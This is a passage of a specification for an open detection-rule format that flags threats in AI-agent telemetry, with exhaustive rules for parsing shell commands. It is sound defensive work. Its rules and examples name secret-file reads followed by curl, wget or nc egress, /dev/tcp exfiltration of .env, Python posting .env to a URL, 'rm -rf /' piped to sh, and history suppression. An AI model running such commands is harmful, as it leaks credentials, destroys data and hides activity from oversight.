# Threat Rules — Specification (v1.3)

An open detection-rule format for AI-agent security threats, native to the Beacon
endpoint event schema. A rule is a YAML document whose match conditions are
[CEL](https://cel.dev) expressions evaluated against a Beacon endpoint event. Rules
carry their own conformance fixtures, so every published rule is self-verifying.

This is the "Sigma for agent telemetry" layer: the rule format and corpus are open; an
evaluation engine that consumes them may be separate (and closed). Any engine that
produces the same `verdict` for a rule's fixtures conforms to this spec.

- Spec version: `threat-rules/v1.3` (see `VERSION` and [Versioning](#versioning)).
- Canonical event schema: the Beacon endpoint event
  (`pkg/asymptoteobserve` `Event`, `schema_version: "1.0"`).
- Machine-readable structural schemas (JSON Schema, draft 2020-12): `schema.json` for a
  rule, `predicates.schema.json` for a predicate definitions file and `catalog.schema.json`
  for a catalog.
- Event fields a rule can match on: `FIELDS.md` (generated from the event schema;
  regenerate with `beacon rules fields --markdown > spec/threat-rules/FIELDS.md`).
- Reference engine and CLI: `pkg/asymptoteobserve/threatrules` is one conformant
  implementation; `beacon scan` runs rules over local telemetry and `beacon rules`
  manages/authors them. See `docs/threat-rules.md`.

## Rule document

```yaml
id: secret-read-then-egress
spec: threat-rules/v1.1   # needed only because this rule uses correlation.order
version: 2
title: Secret-file read followed by network egress
description: >
  Flags a session that reads a credential file and then issues an outbound
  network command within a short window.
severity: high
status: stable
posture: detect
taxonomy:
  owasp_llm: LLM06
  mitre_atlas: AML.T0024

correlation:
  scope: session
  window: 120s
  order: any
  steps:
    - id: read_secret
      match: >
        e.event.action == "file.read" &&
        e.file.path.matches("(\\.env|credentials|id_rsa|\\.aws/)")
    - id: egress
      match: >
        e.event.action == "command.executed" && (
          e.command.command.matches("curl\\s+.*https?://") ||
          e.command.command.matches("\\bwget\\s") ||
          e.command.command.matches("\\bnc\\s+-")
        )

emit:
  reason: "Secret file read then network egress within one session"

tests:
  - name: positive_basic
    verdict: match
    events:
      - { event: { action: file.read }, file: { path: ".env" }, session: { id: s1 } }
      - { event: { action: command.executed }, command: { command: "curl https://x" }, session: { id: s1 } }
  - name: unrelated
    verdict: no_match
    events:
      - { event: { action: file.read }, file: { path: "README.md" }, session: { id: s1 } }
```

A single-event rule omits `correlation` and carries a top-level `match:` (one CEL
expression).

## Fields

Exactly one of `match` or `correlation` must be present. Required:
`id, version, title, severity, status, posture, emit, tests`.

| Field | Required | Type / values | Meaning |
|---|---|---|---|
| `id` | yes | string `^[a-z0-9][a-z0-9-]*$` | Stable unique identity. Unique across the pack. Flows to `policy.id` on a finding. |
| `spec` | no | `threat-rules/v<major>[.<minor>]` (default `threat-rules/v1`) | Minimum spec version the rule needs. Required when the rule uses a feature added after v1: v1.1 or later for `correlation.order`, v1.2 or later for `e.command.parsed_commands`, v1.3 or later for its `args`, `cwd`, `file_reads`, `file_writes`, `script_sends`, `socket_redirects`, `runs_read`, `span`, `earlier_stages` and `later_stages`, for `e.command.parsed_incomplete`, and for a call to a [predicate](#predicates). See [Versioning](#versioning). |
| `version` | yes | int ≥ 1 | Rule content revision; bump on logic change. |
| `title` | yes | string | Human-readable name. Flows to `policy.name`. |
| `description` | no | string | Documentation only; never evaluated. |
| `severity` | yes | `info` \| `low` \| `medium` \| `high` \| `critical` | Mirrors the event severity enum. |
| `status` | yes | `experimental` \| `stable` \| `deprecated` | Maturity; drives conformance gates. |
| `posture` | yes | `detect` \| `enforce-capable` | Observe-only vs. enforcement-eligible. Flows to `policy.enforcement`. |
| `taxonomy` | no | map<string,string> | External references (OWASP/MITRE/CVE), plus `beacon_category`: the corpus directory the rule belongs to (`credential-access`, `prompt-injection`, ...), which survives installation into the flat rule store. No runtime lookup. |
| `match` | one-of | CEL string → bool | Single-event condition over `e`. |
| `correlation` | one-of | object | Multi-event session window (below). |
| `emit.reason` | yes | non-empty string | Finding explanation; flows to `policy.reason`. |
| `tests` | yes | list ≥ 1 | Embedded conformance fixtures (below). |

### `correlation`

| Field | Required | Type / values | Meaning |
|---|---|---|---|
| `scope` | yes | `session` | Grouping key (`e.session.id`). v1 supports `session` only. |
| `window` | yes | Go duration (`120s`, `5m`) | Max elapsed time from the earliest matched event to the latest. |
| `order` | no | `sequence` (default) \| `any` | Whether `steps` must occur in listed order. Since v1.1; a rule that sets it MUST declare `spec: threat-rules/v1.1` or later. |
| `steps` | yes | list ≥ 2 | Step conditions; see `order`. |
| `steps[].id` | yes | string | Step label (diagnostics). Not evaluated. |
| `steps[].match` | yes | CEL string → bool | Per-event condition, same contract as top-level `match`. |

`order` selects how the steps align with events:

- `sequence` (the default when `order` is omitted): the steps form an ordered sequence. Each
  step's event must be at-or-after the previous matched event, and the final step's event
  must be within `window` of the first.
- `any`: each step must be satisfied by a distinct event, in whatever order those events
  occurred, with every matched event within `window` of the earliest one. Use it when the
  risk is the combination rather than the sequence — a secret read and an egress command
  in one session are an exfiltration signal whichever came first, for instance when an
  injected instruction says "run this, then read `.env`".

In both modes a rule produces at most one finding per session, so a session that contains
the steps in both orders still fires once. A single event never satisfies two steps.

### `tests[]`

| Field | Required | Type / values | Meaning |
|---|---|---|---|
| `name` | yes | string | Fixture name. |
| `verdict` | yes | `match` \| `no_match` | Expected outcome when `events` run through an engine. |
| `events` | yes | list of partial events | Ordered input. Each entry follows the Beacon event JSON shape (`event.action`, `command.command`, `file.path`, …). Unspecified fields default to empty. |

## CEL contract

- The event is bound as the variable `e`. Field paths mirror the event JSON
  (`e.event.action`, `e.command.command`, `e.file.path`, `e.prompt.text`,
  `e.gen_ai.usage.input_tokens`, …).
- An expression must type to `bool`.
- The event is presented as a map, so absent sub-objects are null-safe: reference a
  field on a possibly-missing object only behind the value it would carry; engines treat
  a missing path as an empty/zero value (a `match` referencing a missing field yields
  `false`, never an error at evaluation time).
- Regular expressions use RE2 via CEL `.matches(re)` (the same engine as Go `regexp`).
  RE2 runs in time linear in its input and has no backtracking, so a pattern cannot be
  made to run super-linearly (no ReDoS); cost is bounded by the size of the text matched.
- Evaluation is bounded. Macros (`.all`, `.exists`, `.map`, `.filter`) can nest, so an
  expression can do work exponential in its own length. An engine SHOULD cap the work one
  evaluation of one expression against one event may do, and MUST report an evaluation it
  stops as an error for that rule, never as a `match` or `no_match`. Such an error is about
  that rule on that event: an engine scanning a log SHOULD report it and go on to the other
  rules and events, and a correlation rule treats the step as not holding for that event.
  The reference engine uses cel-go's runtime cost limit at 5,000,000
  (`threatrules.MaxEvalCost`); every rule in
  the open corpus spends under 50,000 (a hundredth of the limit) on its fixtures, and under
  1,000,000 (a fifth) on a pessimistic event whose every string field is 64 KiB. A rule
  should stay orders of magnitude below the limit on any event the writer can produce (at
  most 64 KiB).
- Derived fields. `e.gen_ai.tool.call.result_text` is not on the wire: an engine MUST
  compute it from the event before evaluation, and MUST ignore any value an input
  claims for it. It is `gen_ai.tool.call.result` as text (a string as is; for an object
  or list, every string it contains, maps in sorted key order, joined by `\n`, trimmed),
  capped at 4096 bytes and passed through the event writer's secret redaction. One case
  differs: a list element whose `type` is `text`, `image`, `audio`, `document`,
  `resource` or `resource_link` is a content block, and contributes none of its `type`,
  `mimeType`, `annotations`, `_meta` or `sha256` fields, no string `data` or `blob`, and
  no `source` whose `type` is `base64`; the embedded object of a `resource` block is read
  the same way. Objects outside a list are never treated as content blocks. It is
  the empty string unless the event is a read-type tool result — `event.action` is
  `file.read` or `mcp.tool_invoked`, `mcp.server`/`mcp.tool` is set, or the tool is named
  as an MCP tool (`mcp__…`, `MCP:…`) or a web fetch/search tool, or `tool.path` is an
  `http` or `https` URL with a host — and its `content`
  marker, if present, is `included` with a `retention` other than `metadata`. The
  reference derivation is `threatrules.ToolResultText`.
- `e.gen_ai.system_instructions_text` is derived under the same rules (computed, never
  read from input, secret redaction, empty unless the `content` marker, if present, is
  `included` with a `retention` other than `metadata`). It is `gen_ai.system_instructions`
  read in its OpenTelemetry GenAI semconv shape, a list of message parts: the text of each
  part whose `type` is `text` (its `content`, or its `text` when `content` is empty), each
  trimmed and capped at 4096 bytes, in order, joined by `\n`, and the whole capped at 65536
  bytes. A bare string, as the whole value or as a list element, is taken as text; parts of
  any other type contribute nothing. The cap is per part because a skill index holds one
  part per skill, and a cap on the joined text would hide every skill after the first few.
  It is runtime-provided model instructions (for example the skill index on
  `session.context`), never operator-submitted prompt text. The reference derivation is
  `threatrules.SystemInstructionsText`.
- `e.command.parsed_commands` (since v1.2; a rule that selects it MUST declare
  `spec: threat-rules/v1.2` or later) is derived under the same rules (computed, never read
  from input). It is `command.command`, its first 4096 bytes, read as a bash command line: a
  list with one entry per simple command, and per compound command that carries
  redirections, in walk order (each statement, then the statements inside it). Since v1.3 a
  declaration (`export`, `declare`, `typeset`, `readonly`, `local`) is an entry too: the
  builtin is its first word, and each option and each `NAME`, `NAME=value` or `NAME+=value`
  after it is one word, whose value is unknown when the value's is (and for an array or an
  indexed assignment), so `export HISTFILE=/dev/null` has `name` `export` and `args`
  `HISTFILE=/dev/null`. An assignment that is a statement by itself is not a declaration and
  is, as before, an entry with no words and the assignment in `env`. Each entry
  has `name` (the base name of the first word after the wrappers `command`, `builtin`,
  `exec`, `nohup`, `time`, `sudo` and `env` with their options and `NAME=value` words, and,
  since v1.3, `timeout`, `nice`, `ionice`, `stdbuf`, `doas`, `torsocks`, `proxychains`,
  `proxychains4`, `caffeinate`, `setsid` and `chronic` with their options and `timeout`'s
  duration, and the runners `uv run`, `poetry run`, `pipenv run`, `bundle exec` and
  `mise exec ... --`, which start the command in a project's environment; each is recognized
  by its base name so `/usr/bin/env` is `env`; since v1.3 a word whose value is unknown
  still names a program when what follows its last `/` is written out in letters, digits and
  `._+-@`, so `~/bin/tool`, `$HOME/go/bin/tool` and `"$dir"/tool` are `tool`, and a lone `[`
  is the test command and not a glob; a Windows executable's `.exe`, `.cmd` or `.bat` is
  dropped from the name (`ssh-add.exe` is `ssh-add`), and the first word after a PowerShell
  assignment's `$name =` is taken when it is a bare name (`$t = az account get-access-token`
  is `az`); `""` when that word names no program or a wrapper
  option moves or replaces the command or makes the wrapper act on something else, as
  `sudo -i`, `env -C`, `doas -s`, `ionice -p` and `uv run --directory` do, or, since v1.3,
  does not run it, as `sudo -l` (which lists whether the command is allowed), `sudo -v`,
  `sudo -e`, `command -v`, `command -V` and `uv run --module` do),
  `argv` (every word after brace expansion, wrappers included,
  as the shell passes it on, or `""` when its value depends on a parameter, command or
  arithmetic substitution, an ANSI-C or locale string, an unquoted glob character, or a
  leading tilde), `argv_raw` (the same words as written), `args` (since v1.3, with the
  declaration rule of `file_reads`: the words of `argv` after the one `name` is taken from,
  as one string with a newline between words, `""` when there are none; a newline inside a
  word is written as a space, so a line is always one whole word and
  `c.args.matches("(?m)^auth\ntoken$")` is true exactly when the words `auth` and `token`
  follow each other), `env` (the `NAME=value`
  assignments before the command, `""` for an unknown value), `file_effects` (the files the
  command evidently writes, `{path, op}`, of the command `name` names), `file_writes` (the
  same with every path as written, below), `cwd` (the directory the command runs in, below),
  `file_reads` and
  `script_sends` (the files it evidently takes as input and the ones its inline script
  sends, below), `socket_redirects` (its redirections to a network pseudo-file, below),
  `runs_read` and `span` (whether the command line it hands on was read, and the part of
  the line that can decide what it runs, below),
  `pipeline` (shared by the stages of one
  pipeline), `stage` (0-based position in it; a command inside a compound stage such as
  `{ a; b; } | c` or `(a) | c` carries that stage unless it is a stage of an inner pipeline
  or inside a substitution) and `nested` (inside a command or process
  substitution, or inside a command line another command hands on). When `sh`, `bash`,
  `zsh`, `dash` or `ksh` appears (since v1.3 by any path, as `name` is read: `~/bin/bash`)
  as a word of a command with an option cluster containing `c`, its first operand, if known,
  is read the same way, and its commands follow the shell's with
  `nested` true and pipeline numbers of their own. Since v1.3 the same holds for the
  here-document or here-string on the standard input of a command whose `name` is one of
  those shells, when the shell is given neither `-c` nor a script file (`sudo bash <<'EOF'`,
  `sh -s -- arg <<EOF`, `bash <<< 'cmd'`), and for the command line a carrier hands on, when
  `name` is the carrier: the words after the options of `xargs`; the words of each `-exec`,
  `-execdir`, `-ok` and `-okdir` of `find` up to its `;` or `+`; the words after the host of
  `ssh`, after the container of `docker exec`, `podman exec` and `nerdctl exec`, and after
  `--` of `kubectl exec`; the string of `su -c`; the words of `eval` and `watch`; the
  action of `trap`; and the words after a wrapper that runs its command somewhere else and
  so leaves it without a `name` (`sudo -i`, `sudo -D dir`, `sudo -R root`, `env -C dir`,
  `uv run --directory dir`). The words of `xargs`, `find`, the exec commands and such a
  wrapper are read as written;
  the others as the shell passes them on, because a shell reads them again. Those commands
  run where the carrier puts them (another host, a container, once per file); their words
  are still what runs. The same holds for the script a pipe sends a shell that is given
  neither `-c` nor a script file and no input redirection, when every command of the stage
  before it prints its own words: `echo` (with `-e`, `\n` and `\t` are characters), `printf`
  with a format whose only directives are `%s`, `%b` and `%%`, and `cat` given a
  here-document or here-string and no file, each with every word known and no output
  redirection (`echo 'rm -rf /' | sh`, `cat <<'EOF' | sudo bash`); and for the command lines
  the inline script of `python`, `node`, `bun`, `deno`, `ruby` or `php` (its `-c`/`-e`
  value, `deno eval`'s script, or the here-document it reads) runs through Python's
  `os.system`, `os.popen`,
  `subprocess.run`/`call`/`check_call`/`check_output`/`getoutput`/`getstatusoutput`,
  `sp.run` and `sp.call` (subprocess imported as `sp`), and `Popen`, `check_output`,
  `check_call`, `getoutput` and `getstatusoutput` as a function or a method of any name;
  JavaScript's
  `exec`, `execFile`, `spawn` and their `Sync` forms, in a script that names
  `child_process`; Ruby's `system`, `exec`, `spawn`, `IO.popen`, `Process.spawn`,
  `Open3.capture2`, `Open3.capture2e`, `Open3.capture3`, `Open3.popen3`, backticks and
  `%x(..)` (also `%x{..}`, `%x[..]`, `%x<..>`), and PHP's `system`, `exec`, `shell_exec`,
  `passthru`, `popen` and `proc_open` and backticks (a Ruby or PHP call only as written, so
  `conn.exec(..)` and `$db->exec(..)` are not; a Ruby call also without parentheses), when
  the command is written out: a string literal is
  a command line, a list of string literals its words, and an element or a further argument
  that is not a literal is a word whose value is unknown. A literal the language fills in
  (an f-string, `${..}`, `#{..}`) or that is an operand of an expression is not read.
  A command line handed on is read at most three levels deep (two
  before v1.3). Since v1.3 the words after the `-Command` (`-c`) option of `powershell` or
  `pwsh`, joined with spaces as PowerShell joins them, are read the same way, where
  PowerShell and bash agree on a command and its words
  (`powershell -Command "Get-StoredCredential -Target x"`). Other here-document bodies, what
  a pipe sends a
  shell from any other command, a script file, and the rest of an interpreter's code are
  not read as commands. A command line that
  ends early (an unclosed
  quote, here-document, substitution or compound command) yields the commands before the
  point where it became incomplete; one that does not parse yields the empty list, so a
  rule that must not miss such captures keeps a `command.command` fallback for it. The
  reference derivation is `threatrules.ParsedCommands` over `shellcmd.Read`, and the file
  effects are `shellcmd.Command.FileEffects`.

  The two v1.3 changes to `name` and to which commands are listed apply to every rule an
  engine at v1.3 or later evaluates, whatever `spec` the rule declares: an engine derives the
  field once per event. A rule that relies on them (`c.name == "nc"` for `timeout 5 nc ..`)
  SHOULD declare `spec: threat-rules/v1.3`, so an engine at v1.2 sets it aside rather than
  evaluating it on the older derivation.
- `e.command.parsed_incomplete` (since v1.3; a rule that selects it MUST declare
  `spec: threat-rules/v1.3` or later) is derived with `e.command.parsed_commands` and says
  whether the command line was read to its end. It is `true` when `command.command` does not
  parse, when it ends early (an unclosed quote, here-document, substitution or compound
  command, which is what a capture cut by a writer or a runtime looks like), when it is
  longer than the 4096 bytes that are read, or when it names more than is read (below);
  `false` otherwise, and for an event without a command. `parsed_commands` of such a line
  lists the commands before that point only: in
  `cd repo && for d in a b; do rm -rf "$d"` cut after `do`, it is `cd` alone. A rule that
  concludes something from what the list lacks ("no command of this line is X", "every
  command of this line is known") MUST treat an incomplete line as one it has not read.

  A command line is text an agent ran or was made to run, and a few bytes of it can name a
  great deal: `{a,b}{a,b}{a,b}..` doubles its words with every pair, `{1..999999999}` is
  sixteen bytes, a `printf` whose format is reused for each argument prints megabytes into
  a shell, and 4096 bytes hold two thousand one-letter commands, which a rule that compares
  each command with every other reads four million times. The reference derivation
  therefore reads a line only within these bounds, and a line past one has no
  `parsed_commands` and is incomplete, which leaves it to a rule's reading of its text: the
  brace expansions of the line produce at most 1,024 words, and those of its scripts
  together as many again; the text of the command lines the line hands on (its scripts,
  carried command lines, what a pipe sends a shell, what an inline script runs) comes to at
  most 16 KiB together; and the commands of the line and of what it hands on number at most
  256 and come to at most 4,096 words. A line cut inside more than 32 open constructs is
  incomplete with no commands as well. A command line handed on more than three levels deep
  is not a bound: it is not read, the command that hands it on has `runs_read` false, and
  the line is complete.
- `file_writes` (since v1.3; a rule that selects it MUST declare `spec: threat-rules/v1.3` or
  later) is a field of each `parsed_commands` entry: the files the command evidently writes,
  a list of `{path, op}` with the `op` values of `file_effects` (`write`, `append`, `touch`,
  `truncate`, `edit`, `delete`, `move_from`, `move_to`, `link`). `path` is as for
  `file_reads`: the word as written with its quotes and escaping backslashes removed and
  everything the parse does not evaluate left as written, so `>> ~/.bashrc` is
  `{~/.bashrc, append}` and `> "$HOME/.ssh/authorized_keys"` is
  `{$HOME/.ssh/authorized_keys, write}`. `file_effects` leaves such a path out, because an
  effect is the exact file a command wrote; a rule asks what a write names, and `~/.bashrc`
  names a login file whatever the home directory is. Every entry of `file_effects` is an
  entry of `file_writes`, in the same order, and for a command whose words and redirection
  targets are all known the two lists are equal.

  The writes are the targets of the command's output redirections (`>`, `>|`, `&>` and
  `>&file` are `write`, `>>` and `&>>` are `append`; the target of `>&` that names a
  descriptor (`2`, `3-`, `-`) or whose value is unknown, which may be one, is left out), and
  the operands of the command `name` names: `rm`, `unlink` and `git rm` (`delete`), `shred`
  (`write`, or
  `delete` with `-u`), `touch`, `truncate`,
  `tee` (`write`, or `append` with `-a`), in-place `sed`, `gsed` and `perl` (`edit`), `cp`
  and `install` (`write`, the destination), `ln` (`link`) and `mv` and `git mv` (`move_from`
  for each source, `move_to` for the destination). A destination that is a directory (the
  last of three or more operands, one written with a trailing slash, the value of `-t`) is
  reported as the directory joined with each source's base name. Since v1.3 (in
  `file_effects` too, when the path is known) they are also: the file of each `-o` or
  `--output` of `curl`, and with `-O` or `--remote-name` the name each URL ends in, under
  `--output-dir`; the file of `-O` or `--output-document` of `wget`, or else the name each
  URL ends in, under `-P`, and nothing for a recursive download or `--spider`; the `of=`
  file of `dd`; and, when the last operand of `scp` or `rsync` is on this host, that
  operand, or each source's base name under it as for `cp`. Standard output (`-`) and a path
  under `/dev/` are no file, for every command and every redirection (`tee /dev/null` and
  `cp x /dev/null` write none).

  `file_writes` alone also lists a directory a command puts files into, as the directory
  with one trailing slash and `op` `write`, because which files land there is not on the
  command line: where `tar` (`gtar`, `bsdtar`) extracts (`-C`, `--directory`, else `./`),
  where `unzip` extracts (`-d`, else `./`), the directory `git clone` or `gh repo clone`
  creates (its second operand, else the repository's name), and the destination of `rsync`
  for a source written with a trailing slash. The reference derivation is
  `shellcmd.FileWrites`.
- `cwd` (since v1.3; a rule that selects it MUST declare `spec: threat-rules/v1.3` or later)
  is a field of each `parsed_commands` entry: the directory the command runs in when the
  line changed into it before the command, as a literal path, and `""` otherwise. It is the
  operand of the last `cd` or `pushd` before the command, in line order, in the shell the
  command runs in: a `cd` inside a subshell (`( .. )`), a command or process substitution,
  a stage of a pipeline of two or more stages, or a statement run in the background
  (`&`) reaches the commands after it inside that, and none after it. It is written with one
  trailing slash, as `file_writes` writes a directory. An absolute operand is the path
  cleaned (`/tmp/x/../y` is `/tmp/y/`); a relative one is joined to the `cwd` the
  `cd` itself has, and unknown when that is `""`. Options (`-P`, `-L`) and `--` are skipped.
  It is `""` when the line has not changed directory and when where it did is unknown: `cd`
  alone, `cd -`, `pushd +1`, `popd`, an operand that is not a literal, any command after a
  `cd`, `pushd` or `popd` inside a loop or a function's body, and every command of that
  loop, or of the line for a function. A command line another command hands on starts in
  that command's `cwd` when a shell, an interpreter, `eval` or `xargs` runs it, and in an
  unknown directory otherwise (`ssh`, `docker exec`, `sudo -i`). A relative path of
  `file_writes` names the file under `cwd`. The reference derivation is `shellcmd`'s
  `Command.Dir`.
- `file_reads` (since v1.3; a rule that selects it MUST declare `spec: threat-rules/v1.3` or
  later) is a field of each `parsed_commands` entry: the files whose content the command
  evidently takes in, a list of `{path, via}`. `path` is the word as written with its quotes
  and escaping backslashes removed and everything the parse does not evaluate left as written,
  so `"$HOME/.netrc"` is `$HOME/.netrc` and `~/.ssh/id_*` is itself. That differs from
  `file_effects`, which leaves out a path it cannot evaluate: a rule asks what a read names,
  and `~/.ssh/id_rsa` names a private key whatever the home directory is. `via` is how the
  content reaches the command:
  - `direct`: the command opens the file itself. The command is the one `name` names. By that
    command:
    - `cat`, `tac`, `head`, `tail`, `less`, `more`, `bat`, `nl`, `strings`, `od`, `hexdump`,
      `base64`: every operand; `xxd`: the first. A word that begins with `+` is not an operand
      of `less`, `more` or `tail`.
    - `grep`, `egrep`, `fgrep`, `rg`, `awk`, `jq`, and `sed` or `gsed` unless it edits in
      place (`-i`, which is a `file_effects` edit): the operands after the pattern, program or
      filter, or every operand when an option supplies it (`-e`, `-f`, `rg --files`). awk's
      `var=value` operands and the values after jq's `--args` and `--jsonargs` are not files.
    - `cp`, `install`: every operand but the last, or every operand with `-t`. `scp`, `rsync`:
      every operand but the last that is not on another host (`host:path`).
    - `tar`: its operands when it creates, appends or updates (`c`, `r`, `u`), none when it
      extracts or lists. `zip`: the operands after the archive's name and the names after
      `-i`, not the names after `-x`.
    - `curl`: the `@file` of `-d`, `--data`, `--data-binary`, `--data-ascii` and `--json`, the
      `@file` or `name@file` of `--data-urlencode`, the `name=@file` or `name=<file` of `-F`,
      and the file of `-T`. `wget`: `--post-file` and `--body-file`. `http`, `https`,
      `httpie`, `xh`, `xhs`: the file of a `name@file`, `name=@file`, `name:=@file` or `@file`
      request item. `gh gist create`: its operands. `socat`: the path of an `OPEN:`, `FILE:`
      or `GOPEN:` address.
    - `python*`, `pypy*`, `node`, `nodejs`, `bun`, `deno eval`, `ruby`, `php`: the paths the
      script given as text opens for reading, where the path is a string literal outside
      strings and comments. The script is the value of `-c`, `-e`, `-p`, `-r`, `--eval` or
      `--print`, or, when no script file is named, the here-document or here-string on
      standard input. The calls are `open` and `Path(..).read_text|read_bytes|open` (python),
      `readFileSync`, `readFile`, `createReadStream`, `readTextFile`, `readTextFileSync` and
      `Bun.file` (JavaScript), `File.read|readlines|binread|foreach|open` and
      `IO.read|readlines|binread|foreach` (ruby), and `file_get_contents`, `fopen`, `readfile`
      and `file` (php). A call whose mode argument holds `w`, `a` or `x` is not a read.
      `script_sends` (since v1.3, with the same declaration rule) lists the paths of those the
      script sends over the network: a file it opens inside the parentheses of a call that
      sends its arguments, at any depth (`.env` for
      `requests.post(url, data=open(".env").read())`), or one whose content a name holds when
      the name is used there (`d = open(".env").read(); requests.post(url, data=d)`). The
      calls are, by their last name, `post`, `put`, `patch`, `request`, `urlopen`, `Request`,
      `send`, `sendall` and `sendto` (python); `fetch`, `axios`, `post`, `put`, `patch`,
      `request`, `send`, `sendBeacon`, `connect` and `createConnection`, and `.end(..)` or
      `.write(..)` called on what one of them returns (JavaScript); `post`, `post_form`, `put`,
      `patch`, and `.write`, `.puts`, `.print` or `.send` called on what `TCPSocket.new(..)` or
      `TCPSocket.open(..)` returns (ruby); `curl_setopt`, `curl_setopt_array`,
      `stream_context_create`, `socket_write`, `socket_send` and `mail` (php). "What one of
      them returns" is the call itself (`https.request(url).end(data)`) or a name assigned it
      (`r = https.request(url); r.write(data)`).

      A name holds a file's content when it is assigned a value that opens the file or uses a
      name that holds it (`name = value`, to the end of the statement: a newline or `;`
      outside parentheses), until it is assigned again; when it follows `as` in a statement
      that opened the file (python `with open(..) as f`); when it is a parameter of a callback
      in a statement that opened it (JavaScript `(err, data) =>`, `data =>`,
      `function (err, data)`); or when it is a parameter of a block there (ruby `{ |f|`,
      `do |f|`). A use of `name.member` is a use of `name`. In python `name=value` inside a
      call's parentheses is an argument and assigns nothing. A name directly before `:` is a
      key and not a use. Scopes, what a function returns, a loop variable, and a value inside
      a string (an f-string, a template literal) are not followed.

      As for `curl`, a call's headers, credentials and URL parameters are not data. Inside a
      call that sends, nothing counts from the name `headers`, `auth`, `params` or `cert`
      (python), `headers`, `auth` or `params` (JavaScript), `headers`, `basic_auth` or `query`
      (ruby), written as `name=` or `name:`, to the next comma at the same depth of
      parentheses, braces and brackets; nor from `CURLOPT_HTTPHEADER`, `CURLOPT_USERPWD`,
      `CURLOPT_URL` or `CURLOPT_XOAUTH2_BEARER` (php) to the end of the call.

      For a command that is not such an interpreter the list is empty: whether `curl` or `nc`
      sends what it takes in is for the rule to say.

    The value of an option is never an operand (`head -n 5`, `scp -i key`, `tar --exclude x`,
    `gh gist create -d text`).
  - `stdin`: the content arrives on the command's standard input: the target of its `<` or
    `<>` redirection, what a substitution or a variable in its here-string or in the body of
    its here-document wrote (a here-document whose delimiter is quoted expands nothing), or
    what the stage before it in its pipeline writes to the pipe.
  - `argument`: the content is written into one of the command's words by a command
    substitution, an input process substitution (`<(..)`), or a variable assigned from one
    earlier in the command line. For `curl`, `wget`, `http`, `https`, `httpie`, `xh` and `xhs`
    only a word they send as the request body counts (the content of `-d`, `--data*`, `--json`,
    `-F`, `--form-string`, `--post-data`, `--body-data`, a `name=value` or `name:=json` item):
    a header, a URL or a credential option is not data. For any other command every word
    counts.

  What a command takes in follows the data. A stage writes to its pipe every file it takes in,
  by any `via`, unless its standard output is redirected, or it only reports a count or a
  digest (`wc`, `md5sum`, `md5`, `sha1sum`, `sha224sum`, `sha256sum`, `sha384sum`, `sha512sum`,
  `shasum`, `b2sum`, `cksum`, `sum`). A stage does not read the pipe when its own redirection
  supplies its standard input. A substitution writes what the last stage of each pipeline
  directly inside it writes. A variable holds what the substitutions and variables in its
  value hold, when it is assigned by a statement of assignments only or by `export`, `declare`,
  `local`, `readonly` or `typeset`; an assignment before a command is that command's
  environment and is followed only into a script the command runs (below). A file written earlier in the command line holds what the
  command that wrote it took in (the target of `>` and `>>`, the destination of `cp` and
  `install`, the files of `tee`) or what the file moved onto it held (`mv`), until it is
  written with something else, truncated or deleted; reading it takes that in too, by the
  same `via`. Paths are compared as written.

  The data is followed across the boundary of a script that is read as commands (a shell's
  `-c` text, or the here-document or here-string it reads its script from). The shell writes
  what the last stage of each pipeline directly in its script writes, in place of what the
  shell itself took in, so in `bash -c 'cat .env' | nc ..` the read is on `cat` and, by
  `stdin`, on `nc`. A first stage directly in the script takes in by `stdin` what the shell
  took in by `stdin`, unless a redirection of its own supplies its standard input. A variable
  belongs to the shell that assigned it: a script reads its own, those of the `NAME=value`
  prefix of the shell that runs it, and those a shell it was started from assigned with
  `export` or named in a later `export NAME`; a script's variables do not leave it. Files
  written are shared.

  Standard input (`-`) and paths under `/dev/` are left out. The literal text of a
  here-document that is not a script is not read as commands, and what a script of another
  language does with a file through a variable is not followed. A shell that reads its
  script from a here-document takes in what the body expands, and its script's commands do
  not read that as their standard input. The reference derivation is `shellcmd.Read`
  (`Line.Reads`).
- `socket_redirects` (since v1.3; a rule that selects it MUST declare
  `spec: threat-rules/v1.3` or later) on an entry of `e.command.parsed_commands` lists the
  command's redirections to or from bash's network pseudo-files, each `{path, op}`. `path` is
  the target as written without its quotes, when it begins `/dev/tcp/` or `/dev/udp/` and
  names something after it: `/dev/tcp/host.example/4444`, and `/dev/tcp/$HOST/$PORT` as
  written. `op` is `write` for `>`, `>>`, `>|`, `&>`, `&>>` and `>&`, `read` for `<` and
  `<&`, and `readwrite` for `<>`. A redirection that duplicates a descriptor (`>&3`, `<&3`)
  is one when an earlier `exec` with no command, in the same shell or in the one that started
  this subshell or substitution, left that descriptor open on a pseudo-file: its `path` is
  that pseudo-file and its `op` the direction of the duplication, so in
  `exec 3<>/dev/tcp/h/1; cat .env >&3` the `exec` entry has `{/dev/tcp/h/1, readwrite}` and
  the `cat` entry `{/dev/tcp/h/1, write}`. A later `exec` that closes the descriptor or
  points it elsewhere ends that. The same path as a word of a command is not a redirection.
  The reference derivation is `shellcmd.Read` (`Line.Sockets`).
- `runs_read` (since v1.3; a rule that selects it MUST declare `spec: threat-rules/v1.3` or
  later) on an entry of `e.command.parsed_commands` is true when the command hands a command
  line to another program to run (a shell's `-c` script, the here-document it reads or the
  literal script a pipe sends it, the command line of a carrier, and the command of a
  wrapper that runs it somewhere else, above) and the engine read that command line to its
  end, so that its commands follow the entry in the list. It is false when the command hands
  none on, when the command line is not a known word (`bash -c "$CMD"`), when it does not
  parse to its end, and when it is nested deeper than the engine reads. It is false for a
  shell that follows a word which is not a wrapper (`"$TOOL" sh -c 'id'`), whose script is
  listed all the same, and for an interpreter whose inline script runs commands that are
  listed: a script can run what its text does not show. A rule uses it to
  tell a program whose commands answer for themselves from one it cannot see into.
  For `xargs` and `find` it says only that the command they run is listed: that command's
  operands come from a pipe or from what `find` matches, which the entry does not hold.
  The reference derivation is `shellcmd.Command.RunsRead` over `shellcmd.Read`.
- `span` (since v1.3; a rule that selects it MUST declare `spec: threat-rules/v1.3` or
  later) on an entry of `e.command.parsed_commands` is the part of the command line that can
  decide what the command runs, as text. It exists for the rule that must match text because
  a command is a program the engine cannot see into (an interpreter, a project's script, a
  tool no list names): such a program runs what it is given, and `span` is what the line
  gives it, where `command.command` would also hold a commit message three commands away.
  A command's own piece of the line runs from its first word, or from the first earlier
  stage of its pipeline, to the end of its words and redirections; it is the whole of the
  outermost `for`, `while` or `until` loop around the command, and the whole line for a
  command inside a function's body. The span is that piece, preceded by the own piece of
  every command before it that writes a file's content (an entry of `file_writes` with `op`
  `write`, `append`, `edit`, `move_to` or `link` and a path not under `/dev/`), since the
  command may read or run that file without naming it. Pieces are in the order of the line;
  two that overlap or touch are one, others are separated by a newline, and each is
